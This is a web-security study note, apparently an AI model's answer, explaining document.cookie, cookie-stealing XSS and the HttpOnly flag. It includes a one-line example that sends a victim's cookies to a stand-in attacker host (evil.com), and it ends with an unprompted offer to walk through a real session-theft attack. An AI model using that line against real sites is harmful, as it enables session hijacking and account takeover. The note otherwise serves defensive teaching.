Let’s break this down clean, because this one shows up **everywhere** in web security.

---


# 🍪 document.cookie — “The Browser’s Secret Storage”

> **Definition:**  
> `document.cookie` is a JavaScript property that lets you **read and write cookies** stored in the user’s browser for the current website.

---

## 🧠 What are cookies?

Cookies are **small pieces of data** a website stores in your browser.

They usually store things like:
- Login sessions (👈 BIG one)
- User preferences
- Tracking info

---

## 🔍 Reading cookies — “What does the browser know about you?”

```js
console.log(document.cookie);
````

### Example output:

```text
username=Israel; sessionID=abc123; theme=dark
```

👉 It returns **all cookies as one string**

---

## ✍️ Writing cookies — “Leaving a note in the browser”

```js
document.cookie = "username=Israel";
```

You can also add options:

```js
document.cookie = "username=Israel; expires=Fri, 31 Dec 2026 23:59:59 GMT";
```

---

## ⚠️ Why this matters for XSS

Now connect the dots:

If an attacker can run JavaScript (XSS)...

They can do this:

```js
fetch("https://evil.com/steal?data=" + document.cookie);
```

---

## 💣 What just happened?

1. `document.cookie` grabs your cookies
    
2. Sends them to attacker’s server
    
3. If one cookie = session ID…
    

👉 They can **log in as you**

---

## 🧨 Real-world impact

If cookies contain:

- `sessionID`
    
- `authToken`
    

👉 That’s basically your identity on that site

No password needed.

---

## 🔒 Why doesn’t this always work?

Because of **HttpOnly cookies**

---

### 🛡️ HttpOnly — “Hands off, JavaScript” #HttpOnly

If a cookie is set like this (server-side):

```http
Set-Cookie: sessionID=abc123; HttpOnly
```

👉 Then:

```js
document.cookie
```

❌ CANNOT access it

---

## 🧩 So when is it vulnerable?

XSS + cookies = dangerous IF:

- Cookies are **not HttpOnly**
    
- App relies on cookies for authentication
    

---

## ⚔️ Mental Model

|Concept|Meaning|
|---|---|
|document.cookie|Access browser-stored data|
|XSS|Run attacker JavaScript|
|Combined|Steal user identity|

---

## 🧠 Simple analogy

- Cookies = your house keys
    
- `document.cookie` = grabbing the keys
    
- XSS = stranger inside your house
    

👉 You see the problem now

---

## 🚀 Final Takeaway

> `document.cookie` itself is not dangerous

It becomes dangerous when:

- You allow XSS
    
- You expose sensitive cookies
    

---

## 🔗 Related Concepts

- [[XSS (Cross-Site Scripting)]]
    
- [[HTTP Cookies]]
    
- [[Session Hijacking]]
    
- [[HttpOnly Flag]]
    

```

---

If you want, I can show you a **real attack flow step-by-step** (like how someone actually steals a session and logs in as the victim). That’s where this goes from “notes” → “oh… this is real.”
```